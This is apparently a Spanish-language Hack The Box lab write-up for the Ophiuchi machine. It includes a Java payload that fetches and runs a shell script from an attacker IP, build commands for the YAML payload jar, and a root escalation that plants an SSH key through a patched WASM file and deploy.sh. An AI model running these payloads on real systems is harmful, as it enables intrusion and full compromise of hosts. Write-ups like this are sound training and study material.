---
title: "Informe Técnico: Ophiuchi (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Ophiuchi de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ophiuchi/images/step_02.png"
---

# Informe Técnico de Seguridad Ofensiva: Ophiuchi

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Ophiuchi** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Ophiuchi |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

**How many open TCP ports are listening on Ophiuchi?**

R: 2

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ophiuchi/images/step_02.png)

What webserver is running on port 8080? Give the one word answer.

R: tomcat

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ophiuchi/images/step_02.png)

What user is the webserver running as?

R: tomcat

```jsx
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

public AwesomeScriptEngineFactory() throws InterruptedException {
         try {
             Process p = Runtime.getRuntime().exec("curl http://10.10.14.8/shell.sh -o /dev/shm/.s.sh");
             p.waitFor();
             p = Runtime.getRuntime().exec("chmod +x /dev/shm/.s.sh");
             p.waitFor();
             p = Runtime.getRuntime().exec("/dev/shm/.s.sh");
         } catch (IOException e) {
             e.printStackTrace();
         }
     }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}

sudo apt update
sudo apt install -y default-jdk
javac -version
jar --version

mkdir -p out
javac --release 8 -d out src/artsploit/AwesomeScriptEngineFactory.java \
  || javac -source 8 -target 8 -d out src/artsploit/AwesomeScriptEngineFactory.java

jar cf yaml-payload.jar -C out . -C src META-INF/services/javax.script.ScriptEngineFactory
jar tf yaml-payload.jar | grep -E 'Awesome|META-INF/services'

```

![Captura de pantalla 2025-08-16 234436.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ophiuchi/images/step_03.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ophiuchi/images/step_04.png)

**What is the admin user's password on Ophiuchi?**

R: whythereisalimit

![Captura de pantalla 2025-08-17 000229.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ophiuchi/images/step_05.png)

**Submit the flag located in the admin user's home directory.**

R: b9586ac35361cbb4ed407d94dc76a1d4

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ophiuchi/images/step_06.png)

**What is the full path of the binary that the admin user can run as any user without a password on Ophiuchi?**

R: /usr/bin/go

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ophiuchi/images/step_07.png)

What is the name of the web assembly file run by index.go?

R:  main.wasm”

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ophiuchi/images/step_08.png)

What is the name of the shell script that's executed when the wasm file returns "1"?

R: [deploy.sh](http://deploy.sh/) 

![Captura de pantalla 2025-08-17 000929.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ophiuchi/images/step_09.png)

**Is it true that both `main.wasm` and `deploy.sh` are both looked for in the current directory by `index.go`?**

R: yes

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ophiuchi/images/step_10.png)

**Submit the flag located in the root user's home directory.**

R: 7da4575e698bc8934b903d2fee972ac1

```jsx

sshpass -p whythereisalimit scp admin@10.10.10.227:/opt/wasm-functions/main.wasm .
file main.wasm 

(module
(func (export "info") (result i32)
i32.const 1)
)
Compila y prueba:
```

```jsx
bash
Copiar
Editar
wat2wasm main.wat -o main_patched.wasm
wasm-interp main_patched.wasm --invoke=info   # debe imprimir: 1
Sube y sustituye en la máquina:
```

```jsx
bash
Copiar
Editar
sshpass -p 'whythereisalimit' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
main_patched.wasm [admin@10.10.10.227](mailto:admin@10.10.10.227):/dev/shm/
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ophiuchi/images/step_11.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ophiuchi/images/step_12.png)

> 
> 
> 
> # Reversing de `main.wasm`
> 
> ## ¿Qué es WASM (muy breve)?
> 
> **WebAssembly (WASM)** es un formato binario para una VM de pila, portable y rápido. Aunque nació para el navegador, puede ejecutarse en otros entornos. Un módulo WASM exporta funciones/memoria y se invoca desde un *host* (en este caso, un programa en Go).
> 
> ## Extraer y mirar el módulo
> 
> ```bash
> # Copiar desde la máquina víctima (ejemplo de HTB Ophiuchi)
> sshpass -p whythereisalimit scp admin@10.10.10.227:/opt/wasm-functions/main.wasm .
> 
> file main.wasm
> # WebAssembly (wasm) binary module version 0x1 (MVP)
> 
> ```
> 
> ## Herramientas (WABT)
> 
> Instala **WABT** (WebAssembly Binary Toolkit). En Kali/Ubuntu moderno puedes usar paquete o compilar:
> 
> ```bash
> # Opción A (paquete si existe)
> sudo apt install -y wabt
> # Opción B (compilar)
> git clone --recursive https://github.com/WebAssembly/wabt
> cd wabt && make
> 
> ```
> 
> Las utilidades que usaremos:
> 
> - `wasm2wat` → binario → texto `.wat`
> - `wasm-decompile` → binario → “pseudo-C” legible
> - (más tarde) `wat2wasm` → texto `.wat` → binario
> 
> ### Ver el módulo en texto
> 
> ```bash
> wasm2wat main.wasm
> 
> ```
> 
> Salida típica (resumen):
> 
> ```wasm
> (module
>   (type (;0;) (func (result i32)))
>   (func $info (type 0) (result i32)
>     i32.const 0)
>   (export "info" (func $info))
>   ...
> )
> 
> ```
> 
> La función **`info` retorna 0**.
> 
> ### Verlo decompilado (más claro)
> 
> ```bash
> wasm-decompile main.wasm
> 
> ```
> 
> Salida:
> 
> ```c
> export function info():int {
>   return 0
> }
> 
> ```
> 
> **Conclusión:** `main.wasm` exporta `info()` y devuelve **0**, por eso el programa Go no “despliega” (está esperando **1**).
> 
> ---
> 
> # Estrategia de explotación
> 
> - El programa Go **usa rutas relativas**, así que puedes **controlar `main.wasm` y `deploy.sh`** (por ej. copiándolos a `/dev/shm` y ejecutando desde ahí).
> - Si haces que `info()` devuelva **1**, el Go seguirá con el **deploy** y ejecutará `deploy.sh` (con `sudo go run …` lo hará **como root**).
> - En `deploy.sh`, mete una acción que te dé **persistencia**/shell. Lo más cómodo: añadir tu **clave pública** a `/root/.ssh/authorized_keys`.
> 
> ---
> 
> # Crear un WASM que devuelva 1
> 
> Tienes varias formas. Te doy dos:
> 
> ## Opción 1 (rápida y offline): escribir `.wat` a mano y compilar
> 
> Crea un archivo `info1.wat`:
> 
> ```wasm
> (module
>   (type $t0 (func (result i32)))
>   (func $info (type $t0) (result i32)
>     i32.const 1)
>   (export "info" (func $info))
> )
> 
> ```
> 
> Compila a binario:
> 
> ```bash
> wat2wasm info1.wat -o main.wasm
> 
> ```
> 
> > Ese main.wasm ya exporta info() que devuelve 1.
> > 
> 
> ## Opción 2 (online): wasmFiddle / WebAssembly Explorer
> 
> - Escribe un C mínimo:
>     
>     ```c
>     int info(void){ return 1; }
>     
>     ```
>     
> - Compila a WASM, descarga el **binario** y renómbralo a `main.wasm`.
> 
> ---
> 
> # Preparar `deploy.sh`
> 
> Ejemplo (agrega tu clave pública a root):
> 
> ```bash
> cat > deploy.sh << 'EOF'
> #!/bin/bash
> set -e
> echo "[*] Adding public key to /root/.ssh/authorized_keys"
> mkdir -p /root/.ssh
> chmod 700 /root/.ssh
> echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /root/.ssh/authorized_keys
> chmod 600 /root/.ssh/authorized_keys
> echo "[+] Done."
> EOF
> chmod +x deploy.sh
> 
> ```
> 
> > Sustituye la clave por tu ~/.ssh/id_ed25519.pub.
> > 
> 
> ---
> 
> # Ejecución en la víctima
> 
> 1. Sube los ficheros:
> 
> ```bash
> sshpass -p whythereisalimit scp main.wasm deploy.sh admin@10.10.10.227:/dev/shm/
> 
> ```
> 
> 1. Ejecuta el Go (desde la ruta donde espera `main.wasm`/`deploy.sh`; en este ejemplo `/dev/shm`). Si el binario Go se lanza con **sudo**, `deploy.sh` correrá como **root**:
> 
> ```bash
> sshpass -p whythereisalimit ssh admin@10.10.10.227
> cd /dev/shm
> sudo /usr/bin/go run /opt/wasm-functions/index.go
> # Debe imprimir algo tipo:
> # Ready to deploy
> # [*] Adding public key ...
> # [+] Done.
> 
> ```
> 
> 1. En tu máquina:
> 
> ```bash
> ssh -i ~/.ssh/id_ed25519 root@10.10.10.227
> # ¡root!
> 
> ```
> 
> ---
> 
> # Alternativas útiles
> 
> - **Editar el binario original**: puedes `wasm2wat main.wasm > tmp.wat`, cambiar `i32.const 0` → `i32.const 1`, y volver a compilar: `wat2wasm tmp.wat -o main.wasm`.
> - **Ver exports**: `wasm-objdump -x main.wasm` lista funciones exportadas (útil para confirmar que `info` exista).
> - **Si el host valida más cosas**: añade en tu `.wat` memoria/exports “dummy” para que coincidan con lo que usa el Go (pero en el caso del writeup bastó con `info()`).
> 
> ---
> 
> # TL;DR (comandos mínimos)
> 
> ```bash
> # en tu VM
> cat > info1.wat <<'WAT'
> (module (type $t0 (func (result i32)))
>   (func $info (type $t0) (result i32) i32.const 1)
>   (export "info" (func $info)))
> WAT
> wat2wasm info1.wat -o main.wasm
> 
> cat > deploy.sh << 'EOF'
> #!/bin/bash
> set -e
> mkdir -p /root/.ssh
> chmod 700 /root/.ssh
> echo "ssh-ed25519 AAAA...TU_CLAVE..." >> /root/.ssh/authorized_keys
> chmod 600 /root/.ssh/authorized_keys
> EOF
> chmod +x deploy.sh
> 
> sshpass -p whythereisalimit scp main.wasm deploy.sh admin@10.10.10.227:/dev/shm/
> 
> # en la víctima
> sudo /usr/bin/go run /opt/wasm-functions/index.go
> 
> # en tu VM
> ssh -i ~/.ssh/id_ed25519 root@10.10.10.227
> 
> ```
>

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
